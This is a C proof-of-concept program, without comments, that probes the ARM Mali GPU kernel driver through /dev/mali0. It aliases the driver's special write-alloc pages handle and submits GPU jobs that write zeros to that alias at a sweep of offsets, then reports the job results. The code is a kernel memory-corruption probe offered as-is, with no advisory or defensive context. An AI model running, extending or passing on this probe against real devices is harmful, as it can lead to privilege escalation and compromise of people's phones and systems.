#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#define MALI_IOCTL(size) _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, (size))

#define UKP_FUNC_ID_CHECK_VERSION 0
#define UK_FUNC_ID 512
#define KBASE_FUNC_MEM_ALLOC   (UK_FUNC_ID + 0)
#define KBASE_FUNC_MEM_FREE    (UK_FUNC_ID + 4)
#define KBASE_FUNC_MEM_ALIAS   (UK_FUNC_ID + 6)
#define KBASE_FUNC_SET_FLAGS   (UK_FUNC_ID + 18)
#define KBASE_FUNC_JOB_SUBMIT  (UK_FUNC_ID + 28)

#define BASE_MEM_PROT_CPU_RD      (1U << 0)
#define BASE_MEM_PROT_CPU_WR      (1U << 1)
#define BASE_MEM_PROT_GPU_RD      (1U << 2)
#define BASE_MEM_PROT_GPU_WR      (1U << 3)
#define BASE_MEM_COHERENT_LOCAL   (1U << 11)

#define BASE_MEM_WRITE_ALLOC_PAGES_HANDLE  (4ULL << 12)

#define BASE_JD_REQ_CS             (1U << 1)
#define MALI_WRITE_VALUE_TYPE_ZERO 3

#define BASE_JD_EVENT_DONE               0x00000001
#define BASE_JD_EVENT_DATA_INVALID_FAULT 0x00000058
#define BASE_JD_EVENT_JOB_CANCELLED      0x00004002
#define BASE_JD_EVENT_JOB_INVALID        0x00004003

typedef union {
    uint32_t id;
    uint32_t ret;
    uint64_t align;
} uk_header;

struct uku_version_check_args {
    uk_header header;
    uint16_t major;
    uint16_t minor;
    uint8_t padding[4];
};

struct kbase_uk_set_flags {
    uk_header header;
    uint32_t create_flags;
    uint32_t padding;
};

struct kbase_uk_mem_alloc {
    uk_header header;
    uint64_t va_pages;
    uint64_t commit_pages;
    uint64_t extent;
    uint32_t flags;
    uint32_t pad0;
    uint64_t gpu_va;
    uint16_t va_alignment;
    uint8_t pad1[6];
};

struct kbase_uk_mem_free {
    uk_header header;
    uint64_t gpu_addr;
};

struct base_mem_aliasing_info {
    uint64_t handle;
    uint64_t offset;
    uint64_t length;
};

struct kbase_uk_mem_alias {
    uk_header header;
    uint64_t flags;
    uint64_t stride;
    uint64_t nents;
    uint64_t ai;
    uint64_t gpu_va;
    uint64_t va_pages;
};

struct base_jd_udata {
    uint64_t blob[2];
};

struct base_dependency {
    uint8_t atom_id;
    uint8_t dependency_type;
};

struct base_jd_atom_v2_old56 {
    uint64_t jc;
    struct base_jd_udata udata;
    uint64_t extres_list;
    uint16_t nr_extres;
    uint16_t core_req;
    struct base_dependency pre_dep[2];
    uint8_t atom_number;
    uint8_t prio;
    uint8_t device_nr;
    uint8_t padding[5];
    uint8_t extra[8];
};

struct kbase_uk_job_submit_trace {
    uk_header header;
    uint64_t addr;
    uint32_t nr_atoms;
    uint32_t stride;
    uint32_t gles_ctx_handle;
    uint32_t padding;
};

struct base_jd_event_v2 {
    uint32_t event_code;
    uint8_t atom_number;
    uint8_t pad[3];
    struct base_jd_udata udata;
};

static int mali_ioctl(int fd, void *buf, size_t size)
{
    errno = 0;
    return ioctl(fd, MALI_IOCTL(size), buf);
}

static const char *event_name(uint32_t code)
{
    switch (code) {
    case BASE_JD_EVENT_DONE: return "DONE";
    case BASE_JD_EVENT_DATA_INVALID_FAULT: return "DATA_INVALID_FAULT";
    case BASE_JD_EVENT_JOB_CANCELLED: return "JOB_CANCELLED";
    case BASE_JD_EVENT_JOB_INVALID: return "JOB_INVALID";
    default: return "UNKNOWN";
    }
}

static int mali_init(int fd)
{
    struct uku_version_check_args ver;
    struct kbase_uk_set_flags flags;
    void *mtp;

    memset(&ver, 0, sizeof(ver));
    ver.header.id = UKP_FUNC_ID_CHECK_VERSION;
    ver.major = 10;
    ver.minor = 2;
    if (mali_ioctl(fd, &ver, sizeof(ver)) < 0 || ver.header.ret != 0)
        return -1;

    memset(&flags, 0, sizeof(flags));
    flags.header.id = KBASE_FUNC_SET_FLAGS;
    if (mali_ioctl(fd, &flags, sizeof(flags)) < 0 || flags.header.ret != 0)
        return -1;

    mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)4096,
                          PROT_NONE, MAP_SHARED, fd, (unsigned long)2);
    if (mtp == MAP_FAILED)
        mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)4096,
                              PROT_NONE, MAP_SHARED, fd, (unsigned long)3);
    return mtp == MAP_FAILED ? -1 : 0;
}

static uint64_t mali_alloc_page(int fd)
{
    struct kbase_uk_mem_alloc alloc;

    memset(&alloc, 0, sizeof(alloc));
    alloc.header.id = KBASE_FUNC_MEM_ALLOC;
    alloc.va_pages = 1;
    alloc.commit_pages = 1;
    alloc.extent = 1;
    alloc.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                  BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                  BASE_MEM_COHERENT_LOCAL;
    if (mali_ioctl(fd, &alloc, sizeof(alloc)) < 0)
        return 0;
    return alloc.header.ret == 0 ? alloc.gpu_va : 0;
}

static void mali_free_checked(int fd, uint64_t gpu_va)
{
    struct kbase_uk_mem_free mf;

    if (!gpu_va)
        return;
    memset(&mf, 0, sizeof(mf));
    mf.header.id = KBASE_FUNC_MEM_FREE;
    mf.gpu_addr = gpu_va;
    mali_ioctl(fd, &mf, sizeof(mf));
}

static void *mali_cpu_map(int fd, uint64_t gpu_va)
{
    return (void *)syscall(__NR_mmap2, (unsigned long)NULL, 4096,
                           PROT_READ | PROT_WRITE, MAP_SHARED, fd,
                           (unsigned long)(gpu_va >> 12));
}

static void build_zero_desc(uint32_t *jc_cpu, uint64_t target_gpu_va)
{
    memset(jc_cpu, 0, 56);
    jc_cpu[4] = 0x00010005;
    jc_cpu[8] = (uint32_t)target_gpu_va;
    jc_cpu[9] = (uint32_t)(target_gpu_va >> 32);
    jc_cpu[10] = MALI_WRITE_VALUE_TYPE_ZERO;
}

static int submit_zero_job(int fd, uint64_t jc_gpu_va, uint8_t atom_number,
                           struct base_jd_event_v2 *ev)
{
    struct base_jd_atom_v2_old56 atom;
    struct kbase_uk_job_submit_trace submit;
    struct pollfd pfd;
    ssize_t n;
    int rc;

    memset(&atom, 0, sizeof(atom));
    atom.jc = jc_gpu_va;
    atom.udata.blob[0] = 0x1111000000000000ULL | atom_number;
    atom.udata.blob[1] = 0x2222000000000000ULL | atom_number;
    atom.core_req = BASE_JD_REQ_CS;
    atom.atom_number = atom_number;

    memset(&submit, 0, sizeof(submit));
    submit.header.id = KBASE_FUNC_JOB_SUBMIT;
    submit.addr = (uint64_t)(uintptr_t)&atom;
    submit.nr_atoms = 1;
    submit.stride = sizeof(atom);
    rc = mali_ioctl(fd, &submit, sizeof(submit));
    if (rc != 0 || submit.header.ret != 0)
        return -1;

    memset(&pfd, 0, sizeof(pfd));
    pfd.fd = fd;
    pfd.events = POLLIN | POLLERR | POLLHUP;
    if (poll(&pfd, 1, 1000) <= 0)
        return -1;
    n = read(fd, ev, sizeof(*ev));
    return n == (ssize_t)sizeof(*ev) ? 0 : -1;
}

static uint64_t alias_write_alloc(int fd)
{
    struct base_mem_aliasing_info ai;
    struct kbase_uk_mem_alias alias;

    memset(&ai, 0, sizeof(ai));
    ai.handle = BASE_MEM_WRITE_ALLOC_PAGES_HANDLE;
    ai.offset = 0;
    ai.length = 1;

    memset(&alias, 0, sizeof(alias));
    alias.header.id = KBASE_FUNC_MEM_ALIAS;
    alias.flags = 0x0F;
    alias.stride = 1;
    alias.nents = 1;
    alias.ai = (uint64_t)(uintptr_t)&ai;
    if (mali_ioctl(fd, &alias, sizeof(alias)) < 0)
        return 0;
    printf("MEM_ALIAS write-alloc ret=0x%x gpu_va=0x%llx va_pages=%llu\n",
           alias.header.ret, (unsigned long long)alias.gpu_va,
           (unsigned long long)alias.va_pages);
    return alias.header.ret == 0 ? alias.gpu_va : 0;
}

static void run_case(uint32_t second_offset)
{
    int fd = -1;
    uint64_t alias_gpu_va = 0, jc1_gpu_va = 0, jc2_gpu_va = 0, dest_gpu_va = 0;
    uint64_t alias2_gpu_va = 0;
    uint32_t *jc1_map = MAP_FAILED, *jc2_map = MAP_FAILED;
    uint64_t *dest_map = MAP_FAILED;
    struct base_jd_event_v2 ev1, ev2, ev3, ev4;

    printf("case first=0x000 second=0x%03x\n", second_offset);
    fd = open("/dev/mali0", O_RDWR | O_CLOEXEC | O_NONBLOCK);
    if (fd < 0 || mali_init(fd) < 0) {
        printf("Mali init failed errno=%d (%s)\n", errno, strerror(errno));
        goto out;
    }

    alias_gpu_va = alias_write_alloc(fd);
    jc1_gpu_va = mali_alloc_page(fd);
    jc2_gpu_va = mali_alloc_page(fd);
    dest_gpu_va = mali_alloc_page(fd);
    jc1_map = (uint32_t *)mali_cpu_map(fd, jc1_gpu_va);
    jc2_map = (uint32_t *)mali_cpu_map(fd, jc2_gpu_va);
    dest_map = (uint64_t *)mali_cpu_map(fd, dest_gpu_va);
    printf("alias=0x%llx jc1=0x%llx jc2=0x%llx dest=0x%llx\n",
           (unsigned long long)alias_gpu_va, (unsigned long long)jc1_gpu_va,
           (unsigned long long)jc2_gpu_va, (unsigned long long)dest_gpu_va);
    if (!alias_gpu_va || !jc1_gpu_va || !jc2_gpu_va || !dest_gpu_va ||
        jc1_map == MAP_FAILED || jc2_map == MAP_FAILED || dest_map == MAP_FAILED)
        goto out;

    memset(dest_map, 0xAA, 4096);
    build_zero_desc(jc1_map, alias_gpu_va);
    msync(jc1_map, 4096, MS_SYNC | MS_INVALIDATE);
    msync(dest_map, 4096, MS_SYNC | MS_INVALIDATE);

    if (submit_zero_job(fd, jc1_gpu_va, 1, &ev1) < 0) {
        printf("first submit failed errno=%d (%s)\n", errno, strerror(errno));
        goto out;
    }

    build_zero_desc(jc1_map, alias_gpu_va + second_offset);
    msync(jc1_map, 4096, MS_SYNC | MS_INVALIDATE);
    if (submit_zero_job(fd, jc1_gpu_va, 2, &ev2) < 0) {
        printf("second submit failed errno=%d (%s)\n", errno, strerror(errno));
        goto out;
    }

    build_zero_desc(jc2_map, dest_gpu_va);
    msync(jc2_map, 4096, MS_SYNC | MS_INVALIDATE);
    if (submit_zero_job(fd, jc2_gpu_va, 3, &ev3) < 0) {
        printf("baseline submit failed errno=%d (%s)\n", errno, strerror(errno));
        goto out;
    }

    alias2_gpu_va = alias_write_alloc(fd);
    if (alias2_gpu_va) {
        build_zero_desc(jc1_map, alias2_gpu_va);
        msync(jc1_map, 4096, MS_SYNC | MS_INVALIDATE);
        if (submit_zero_job(fd, jc1_gpu_va, 4, &ev4) < 0)
            printf("re-alias target submit failed errno=%d (%s)\n", errno, strerror(errno));
    }

    printf("result first=0x%08x(%s) second=0x%08x(%s) baseline=0x%08x(%s) dest=0x%016llx fresh=0x%08x(%s)\n",
           ev1.event_code, event_name(ev1.event_code),
           ev2.event_code, event_name(ev2.event_code),
           ev3.event_code, event_name(ev3.event_code),
           (unsigned long long)dest_map[0],
           ev4.event_code, event_name(ev4.event_code));

out:
    if (dest_map != MAP_FAILED)
        munmap(dest_map, 4096);
    if (jc2_map != MAP_FAILED)
        munmap(jc2_map, 4096);
    if (jc1_map != MAP_FAILED)
        munmap(jc1_map, 4096);
    mali_free_checked(fd, dest_gpu_va);
    mali_free_checked(fd, jc2_gpu_va);
    mali_free_checked(fd, jc1_gpu_va);
    mali_free_checked(fd, alias2_gpu_va);
    mali_free_checked(fd, alias_gpu_va);
    if (fd >= 0)
        close(fd);
}

int main(void)
{
    static const uint32_t offsets[] = {
        0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30,
        0x40, 0x80, 0x100, 0x200, 0x400, 0x800
    };
    size_t i;
    pid_t pid;
    int status = 0;

    printf("=== Mali write-alloc oneshot probe ===\n");
    for (i = 0; i < sizeof(offsets) / sizeof(offsets[0]); i++) {
        pid = fork();
        if (pid < 0)
            return 1;
        if (pid == 0) {
            alarm(20);
            run_case(offsets[i]);
            _exit(0);
        }
        waitpid(pid, &status, 0);
        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
            printf("case second=0x%03x exited abnormally status=0x%x\n", offsets[i], status);
    }
    return 0;
}
